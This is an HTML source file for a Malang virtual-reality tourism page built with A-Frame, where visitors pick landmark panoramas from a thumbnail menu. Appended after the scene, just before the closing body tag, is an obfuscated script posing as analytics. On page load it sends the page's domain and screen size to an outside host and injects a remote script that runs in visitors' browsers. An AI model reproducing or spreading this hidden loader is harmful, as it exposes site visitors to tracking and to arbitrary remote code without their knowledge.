<!DOCTYPE html>
<html>
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <title>Malang Virtual Reality Tourism</title>
    <link rel="manifest" href="manifest.json">
    <script src="https://aframe.io/releases/1.0.4/aframe.min.js"></script>
    <script src="https://unpkg.com/aframe-look-at-component@0.5.1/dist/aframe-look-at-component.min.js"></script>
    <script src="https://cdn.rawgit.com/zcanter/aframe-gradient-sky/master/dist/gradientsky.min.js"></script>
    <script src="https://unpkg.com/aframe-animation-component@^4.1.2/dist/aframe-animation-component.min.js"></script>
    <script src="https://unpkg.com/aframe-event-set-component@^4.0.0/dist/aframe-event-set-component.min.js"></script>
    <script src="https://unpkg.com/@tlaukkan/aframe-three-color-gradient-shader@0.0.1/index.js"></script>
    <script>

      var gradientData=[
                       {name:"Alun alun",type:"image",src:"alunalunImg"},
					   {name:"Kayutangan",type:"image",src:"kayutanganImg"},
					   {name:"Jalan Ijen",type:"image",src:"jalanijenImg"},
					   {name:"Masjid",type:"image",src:"masjidImg"},
					   {name:"Patung Kapal",type:"image",src:"patungkapalImg"},
					   {name:"Pemerintah",type:"image",src:"pemerintahImg"},
					   {name:"Simpang Balap",type:"image",src:"simpangbalapImg"},
					   {name:"Stasiun Baru",type:"image",src:"stasiunbaruImg"},
					   {name:"Monumen Tugu",type:"image",src:"monumentuguImg"}
					   ];

      var thumbData=[
                       {name:"Alun alun",type:"image",src:"alunalunThumb"},
					   {name:"Kayutangan",type:"image",src:"kayutanganThumb"},
					   {name:"Jalan Ijen",type:"image",src:"jalanijenThumb"},
					   {name:"Masjid",type:"image",src:"masjidThumb"},
					   {name:"Patung Kapal",type:"image",src:"patungkapalThumb"},
					   {name:"Pemerintah",type:"image",src:"pemerintahThumb"},
					   {name:"Simpang Balap",type:"image",src:"simpangbalapThumb"},
					   {name:"Stasiun Baru",type:"image",src:"stasiunbaruThumb"},
					   {name:"Monumen Tugu",type:"image",src:"monumentuguThumb"}
					   ];
      
      // Component to change to a sequential color on click.
      AFRAME.registerComponent('select-gradient', {
        init: function () {
          this.el.addEventListener('click', function (evt) {
            var grad=this.getAttribute("id");
            console.log(grad);
            var gradcol={};
            
            for(var i=0;i<gradientData.length;i++)
            {
              if(gradientData[i].name==grad)
              {
                if(gradientData[i].type=="gradient")
                {
                  gradcol={"topColor":gradientData[i].topColor,"bottomColor":gradientData[i].bottomColor,"middleColor":gradientData[i].middleColor};
                  
                  console.log(grad,gradcol.topColor);
                }
                else if(gradientData[i].type=="image")
                {
                  gradcol={"src":gradientData[i].src};
                  console.log(grad,gradcol.src);
                }
                break;
              } 
            }
            
            
            var sk=document.getElementById("skyid");
            
            if(gradcol.src!=undefined)
            {
              
              sk.setAttribute('material',{src:"#"+gradcol.src,shader:"flat"});
            }
            
            if(gradcol.topColor!=undefined)
            {
              sk.setAttribute("material",{shader:"threeColorGradientShader",topColor:lastcol.topColor,bottomColor:lastcol.bottomColor,middleColor:lastcol.middleColor});
              sk.setAttribute("animation__top",{property:'material.topColor',to:gradcol.topColor,startEvents:'startSkyAnim'});
              sk.setAttribute("animation__middle",{property:'material.middleColor',to:gradcol.middleColor,startEvents:'startSkyAnim'});
              sk.setAttribute("animation__bottom",{property:'material.bottomColor',to:gradcol.bottomColor,startEvents:'startSkyAnim'});
              sk.emit("startSkyAnim");
              lastcol={topColor:gradcol.topColor,middleColor:gradcol.middleColor,bottomColor:gradcol.bottomColor};
            }
            
            
          });
          this.el.addEventListener('mouseenter', function (evt) {
            var cur=document.getElementById("cursor-visual");
            console.log("Mouse enter");
            cur.emit("startFuse");
            
          });
          this.el.addEventListener('mouseleave', function (evt) {
            var cur=document.getElementById("cursor-visual");
            console.log("Mouse leave");
            cur.emit("stopFuse");
          });
          
        }
      });
      
      AFRAME.registerComponent('gradient-platform', {
        init: function () {
          var y = 0;
          var returner=0;
          for(var i=0;i<gradientData.length;i++)
          {
              var mel = document.createElement('a-entity');
              mel.setAttribute("id",gradientData[i].name);
              mel.setAttribute("position",{x:-4.5+1.2 * i,y:1.5-y,z:-0.2});
              mel.setAttribute("rotation",{x:0,y:0,z:0});
              mel.setAttribute("select-gradient",'');
              
            
              var img=document.createElement('a-image');
              img.setAttribute("src","#"+thumbData[i].src);
              
              
              //mel.appendChild(col);
              mel.appendChild(img);
              
              this.el.appendChild(mel);
          }
        }
      });
      
      //Hide plat
      AFRAME.registerComponent('hide-plat', {
        init: function () {
          
          this.el.addEventListener('click', function (evt) {
                var sceneEl = document.querySelector('a-scene');
                var show = sceneEl.querySelector('#plat').getAttribute('visible');
            
                if(show){
                  sceneEl.querySelector('#plat').setAttribute("visible","false");
                }else{
                  sceneEl.querySelector('#plat').setAttribute("visible","true");
                }
                show= !show;
                console.log("visibility : " + show);
                       
          });
          this.el.addEventListener('mouseenter', function (evt) {
            var cur=document.getElementById("cursor-visual");
            console.log("Mouse enter");
            cur.emit("startFuse");
            
          });
          this.el.addEventListener('mouseleave', function (evt) {
            var cur=document.getElementById("cursor-visual");
            console.log("Mouse leave");
            cur.emit("stopFuse");
          });
          
        }
      });
    </script>
  </head>
  <body>
    <a-scene>
      <a-assets>
		<img id="alunalunThumb" src="img/1_alunalun_thumbs.png"/>
		<img id="kayutanganThumb" src="img/2_kayutangan_thumbs.png"/>
		<img id="jalanijenThumb" src="img/3_jalanijen_thumbs.png"/>
		<img id="masjidThumb" src="img/4_masjid_thumbs.png"/>
		<img id="patungkapalThumb" src="img/5_patungkapal_thumbs.png"/>
		<img id="pemerintahThumb" src="img/6_pemerintah_thumbs.png"/>
		<img id="simpangbalapThumb" src="img/7_simpangbalap_thumbs.png"/>
		<img id="stasiunbaruThumb" src="img/8_stasiunbaru_thumbs.png"/>
		<img id="monumentuguThumb" src="img/9_monumentugu_thumbs.png"/>
		
		<img id="alunalunImg" src="img/1_alunalun.jpg"/>
		<img id="kayutanganImg" src="img/2_kayutangan.jpg"/>
		<img id="jalanijenImg" src="img/3_jalanijen.jpg"/>
		<img id="masjidImg" src="img/4_masjid.jpg"/>
		<img id="patungkapalImg" src="img/5_patungkapal.jpg"/>
		<img id="pemerintahImg" src="img/6_pemerintah.jpg"/>
		<img id="simpangbalapImg" src="img/7_simpangbalap.jpg"/>
		<img id="stasiunbaruImg" src="img/8_stasiunbaru.jpg"/>
		<img id="monumentuguImg" src="img/9_monumentugu.jpg"/>
      </a-assets>
      
            <!--plat-->
      <a-entity id="plat" gradient-platform position="0 1 -4" rotation="0 0 0" visible="true">
          <a-text font="roboto" value="Welcome to Malang Virtual Reality Tourism" width="30" position="-11 1 -15"></a-text>
      </a-entity>
      
      <!--menu to hide plat-->
      <a-entity id="menu" htmlembed="ppu:256" position="0 -3 -15" rotation="" hide-plat="">
          <a-image src="img/menu.png" height="2" width="2"/>
      </a-entity>
	  
	  
      
      <a-sky id="skyid" material="src:#alunalunImg" rotation="0 -90 0"
            animation__top="property:material.topColor;startEvents:startSkyAnim;autoplay:false;to:#ffffff"
            animation__bottom="property:material.bottomColor;startEvents:startSkyAnim;autoplay:false;to:#ffffff"
            animation__middle="property:material.middleColor;startEvents:startSkyAnim;autoplay:false;to:#ffffff">

      </a-sky>
      
      <a-entity id="cam" camera position="0 1.6 0" look-controls wasd-controls>
        <a-entity id="cursor-visual" cursor="fuse:true;fuseTimeout:1000" 
                  material="shader:flat;color:#00ff00" 
                  position="0 0 -1" 
                  geometry="primitive: ring; radiusInner: 0.01; radiusOuter: 0.030;thetaLength:0"
                  animation__start="property: geometry.thetaLength; dir: alternate; dur: 1000;
                                easing: easeInSine; from:0;to: 360;startEvents:startFuse;pauseEvents:stopFuse;autoplay:false"
                  
                  event-set__stop="_event:stopFuse;geometry.thetaLength:0">
          <a-entity geometry="primitive:ring;radiusOuter:0.030;radiusInner:0.01" material="shader:flat;color:#000000"></a-entity>
        </a-entity>

      </a-entity>
    </a-scene>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXWzg7cVpYnkPkyNyBWC2tJcjqHzm31w3Raipo07RjyEU%2fPYJYm5wyMjrsRCE3MzCn133ALmRQ3cJq0Oeu5g2Uwg47ltUBYWoZGylzpEXE0VtaaElBCWv8Tv1MQ53SOrPRAt6KWH6ZjZVxccdgQPeJ8XC5b9aCcrIFlZNPtJ3EtwJkw8jniTSYU1%2b3pX8EvvvP%2bTspdhSSE0AO%2bhKvfyH%2bmxgR8zzaiLczL90EIq6ZgvLw7%2fdxv7tw1i7Tkdjem2yrQ5n7iWtgNPimJJAdRfWjNO6xtKnvTyPkIxAa3eu1Z%2bkNWjchpuePwsNsL%2fP2WULuplDBolH%2bScrGkJeudCPShXU%2faMkkHXw22I%2f9e8u%2f%2bYEYUH7qF6%2b%2bliZtydPy0dYggsXHabE6Elfx%2bC5uJs8n0FanoKacmMereczfxCdi%2fLajOstqbWrh63Bt9zBal4FRXHEyLZL37Wp65qhDNJJjWq2qeBcyp0X%2ftlM%2bvwQSZP9KWkEPddMOysKeaANuCYh8HdVf6fLfCKyxYEUEIHKHQ3W0V65s5RMj" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>